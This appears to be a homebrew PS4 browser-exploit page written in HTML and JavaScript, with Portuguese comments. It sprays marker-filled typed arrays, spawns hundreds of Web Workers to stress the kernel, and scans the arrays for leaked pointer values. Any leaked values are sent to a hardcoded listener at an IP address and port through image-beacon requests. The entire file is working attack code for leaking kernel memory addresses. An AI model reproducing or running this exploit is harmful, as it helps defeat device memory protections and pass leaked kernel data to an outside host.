<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 ROLLING SCAN (NO SAB)</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; text-align: center; padding: 20px; }
        #status { font-size: 1.5em; border: 1px solid #555; padding: 15px; margin: 20px 0; background: #111; word-wrap: break-word; }
        .scanning { color: #ff0; border-color: #ff0; animation: pulse 0.5s infinite; }
        @keyframes pulse { 0% { border-color: #ff0; } 50% { border-color: #f00; } 100% { border-color: #ff0; } }
    </style>
</head>
<body>

    <h1>ROLLING SCAN (START @ 400)</h1>
    <div id="status">EDITAR IP!</div>

    <script>
        // --- CONFIGURAÇÃO ---
        const SERVER_IP = "192.168.3.19"; // <--- SEU IP CONFIRMADO
        const SERVER_PORT = "8000";
        
        const START_SCAN_AT = 400; // Começa a escanear aqui
        const MAX_THREADS = 425;   // Tenta ir até aqui (se não morrer antes)
        const STRUCT_SIZE = 128;   // 512 bytes
        const PATTERN = 0xCAFEBABE;

        let workers = [];
        let sprayBank = []; // Nossos sensores
        let scanning = false;
        let hasLeaked = false;
        
        // Worker Passivo (Só para encher memória)
        const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);

        function start() {
            if(SERVER_IP.includes("XX")) { alert("ARRUME O IP!"); return; }

            // Prepara um lote inicial de sensores (Arrays Normais)
            // Vamos espalhar isso na memória esperando que o Kernel escreva neles
            for(let i=0; i<500; i++) {
                let arr = new Uint32Array(STRUCT_SIZE);
                arr.fill(PATTERN);
                arr[0] = 0x11111111; // Marcador Inicio
                arr[STRUCT_SIZE-1] = 0x99999999; // Marcador Fim
                sprayBank.push(arr);
            }

            document.getElementById('status').innerText = `ALVO: ${SERVER_IP}\nSUBINDO CARGA...`;
            logToAndroid("INICIO_ROLLING_SCAN");

            rampingUp();
        }

        function rampingUp() {
            let i = setInterval(() => {
                // Se já vazamos, para de criar pressão para tentar enviar os dados
                if(hasLeaked) { clearInterval(i); return; }

                // Adiciona Worker
                if (workers.length < MAX_THREADS) {
                    workers.push(new Worker(url));
                    
                    // Atualiza Status visualmente a cada 10
                    if(workers.length % 10 === 0) {
                        document.getElementById('status').innerText = `THREADS: ${workers.length}`;
                    }

                    // --- O PULO DO GATO ---
                    // Se passamos de 400, o perigo é iminente.
                    // Ativamos o scanner a cada novo worker criado.
                    if (workers.length >= START_SCAN_AT) {
                        if(!scanning) {
                            scanning = true;
                            document.getElementById('status').className = "scanning";
                            logToAndroid("SCANNER_ATIVO_400_THREADS");
                        }
                        
                        // Escaneia AGORA. Não espera timer.
                        // O sistema pode morrer no próximo milissegundo.
                        performScan();
                    }

                } else {
                    clearInterval(i);
                    document.getElementById('status').innerText = "LIMITE MÁXIMO! AGUARDANDO CRASH...";
                }
            }, 30); // 30ms entre cada thread (subida controlada)
        }

        function performScan() {
            if(hasLeaked) return;

            // Varre nossos arrays sensores
            // Como não temos SharedArrayBuffer, dependemos que o Kernel
            // tenha corrompido a memória física onde estes arrays vivem.
            for(let k=0; k < sprayBank.length; k++) {
                const arr = sprayBank[k];
                
                // Checagem rápida (Otimização para não travar CPU)
                // Verifica apenas índices chaves onde ponteiros costumam aparecer
                if (arr[0] !== 0x11111111 || arr[16] !== PATTERN || arr[32] !== PATTERN) {
                    
                    // Se algo mudou, faz varredura completa neste array
                    for(let i=0; i < STRUCT_SIZE; i++) {
                        let val = arr[i];
                        
                        // Filtra o nosso lixo
                        if (val !== PATTERN && val !== 0x11111111 && val !== 0x99999999 && val !== 0) {
                            
                            // ACHAMOS!
                            hasLeaked = true;
                            
                            // Envia múltiplos pacotes para garantir
                            let hex = (val >>> 0).toString(16).padStart(8, '0');
                            logToAndroid(`LEAK_FOUND_OFF_${i*4}_VAL_${hex}`);
                            
                            // Tenta pegar o vizinho (parte alta do ponteiro 64-bit)
                            if(i+1 < STRUCT_SIZE) {
                                let hex2 = (arr[i+1] >>> 0).toString(16).padStart(8, '0');
                                logToAndroid(`LEAK_HIGH_VAL_${hex2}`);
                            }
                            
                            document.body.style.backgroundColor = "#fff"; // Flash
                            return; 
                        }
                    }
                }
            }
        }

        function logToAndroid(data) {
            // Dispara requisição GET leve (Image Beacon)
            const img = new Image();
            img.src = `http://${SERVER_IP}:${SERVER_PORT}/${data}`;
        }

        setTimeout(start, 1500);

    </script>
</body>
</html>
